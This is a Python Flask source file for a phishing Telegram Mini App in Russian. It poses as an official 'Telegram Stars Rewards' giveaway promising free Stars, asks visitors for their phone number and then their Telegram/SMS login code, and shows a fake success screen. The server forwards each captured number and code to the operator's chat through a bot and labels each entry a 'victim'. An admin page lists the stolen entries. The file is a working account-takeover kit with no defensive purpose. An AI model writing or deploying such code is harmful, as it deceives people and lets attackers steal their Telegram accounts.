import os
from flask import Flask, request, jsonify
import threading
import requests
import time

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
PORT = int(os.getenv("PORT", 8080))

app = Flask(__name__)
logs = []

# ====================== ОЧЕНЬ КРАСИВЫЙ HTML MINI APP ======================
MINI_APP_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Stars Rewards</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .app {
            width: 100%;
            max-width: 420px;
            background: rgba(15, 15, 35, 0.95);
            border-radius: 24px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.6);
            overflow: hidden;
            padding-bottom: 20px;
        }
        .header {
            background: linear-gradient(90deg, #00ff88, #00ccff);
            color: #000;
            padding: 20px;
            text-align: center;
            font-weight: 600;
            font-size: 20px;
        }
        .content {
            padding: 30px 20px;
        }
        h1 { font-size: 26px; margin-bottom: 8px; text-align: center; }
        p { text-align: center; color: #a0d8ff; margin-bottom: 25px; line-height: 1.4; }
        .input {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 16px;
            background: #1a1a2e;
            color: #fff;
            font-size: 17px;
            margin-bottom: 15px;
        }
        .btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            color: #000;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s;
        }
        .btn:hover { transform: scale(1.05); }
        .progress {
            height: 6px;
            background: #1a1a2e;
            border-radius: 10px;
            margin: 30px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            width: 33%;
            transition: width 0.8s ease;
        }
        .stage {
            text-align: center;
            font-size: 15px;
            color: #88ccff;
            margin-bottom: 10px;
        }
        .footer {
            text-align: center;
            font-size: 13px;
            color: #666;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="header">Telegram Stars Rewards</div>
        <div class="content">
            <h1>🌟 Получай Stars бесплатно</h1>
            <p>Официальное мини-приложение Telegram<br>До 7000 Stars на твой аккаунт уже сегодня!</p>

            <div class="stage" id="stageText">Шаг 1 из 3 • Подтверждение аккаунта</div>
            <div class="progress"><div class="progress-bar" id="progressBar"></div></div>

            <div id="phoneStep">
                <input type="tel" id="phone" class="input" placeholder="+79xxxxxxxxx" required>
                <button class="btn" onclick="nextStep(1)">Продолжить</button>
            </div>

            <div id="codeStep" style="display:none;">
                <input type="text" id="code" class="input" placeholder="Код из Telegram / SMS" required>
                <button class="btn" onclick="nextStep(2)">Отправить код</button>
                <p style="font-size:13px; margin-top:15px; color:#88ccff;">Код уже должен прийти на твой номер. Если не пришёл — подожди 30 секунд.</p>
            </div>

            <div id="successStep" style="display:none; text-align:center;">
                <h2 style="color:#00ff88; margin:30px 0;">🎉 Успешно!</h2>
                <p>На твой аккаунт начислено <b>5750 Stars</b></p>
                <p style="margin-top:20px;">Можешь закрыть мини-приложение</p>
            </div>

            <div class="footer">
                Официальное подключение • Безопасно • Telegram 2026
            </div>
        </div>
    </div>

    <script>
        let currentPhone = "";

        function nextStep(step) {
            if (step === 1) {
                currentPhone = document.getElementById("phone").value.trim();
                if (!currentPhone) return alert("Введите номер телефона");
                
                document.getElementById("phoneStep").style.display = "none";
                document.getElementById("codeStep").style.display = "block";
                document.getElementById("stageText").innerHTML = "Шаг 2 из 3 • Ввод кода";
                document.getElementById("progressBar").style.width = "66%";

                // Отправляем номер на сервер
                fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'phone=' + encodeURIComponent(currentPhone)
                });
            } 
            else if (step === 2) {
                let code = document.getElementById("code").value.trim();
                if (!code) return alert("Введите код");

                fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'phone=' + encodeURIComponent(currentPhone) + '&code=' + encodeURIComponent(code)
                }).then(() => {
                    document.getElementById("codeStep").style.display = "none";
                    document.getElementById("successStep").style.display = "block";
                    document.getElementById("stageText").innerHTML = "Шаг 3 из 3 • Готово!";
                    document.getElementById("progressBar").style.width = "100%";
                });
            }
        }
    </script>
</body>
</html>"""

@app.route('/')
def mini_app():
    return MINI_APP_HTML

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone', '')
    code = request.form.get('code', '')

    if phone:
        msg = f"🌟 MINI APP ЖЕРТВА!\n📱 Номер: {phone}"
        logs.append(msg)
        try:
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={msg}")
        except:
            pass
        print(msg)

    if code and phone:
        msg2 = f"🔑 КОД ИЗ MINI APP!\n📱 {phone}\n🔑 Код: {code}"
        logs.append(msg2)
        try:
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={msg2}")
        except:
            pass
        print(msg2)

    return jsonify({"status": "success"})

@app.route('/admin')
def admin():
    return "<h1>PHANTOM MINI APP LOGS</h1><pre>" + "\n\n".join(logs[-50:]) + "</pre>"

if __name__ == '__main__':
    print("[+] PHANTOM TELEGRAM MINI APP ЗАПУЩЕН")
    print("[+] Открывай Mini App по ссылке от Railway")
    app.run(host='0.0.0.0', port=PORT)
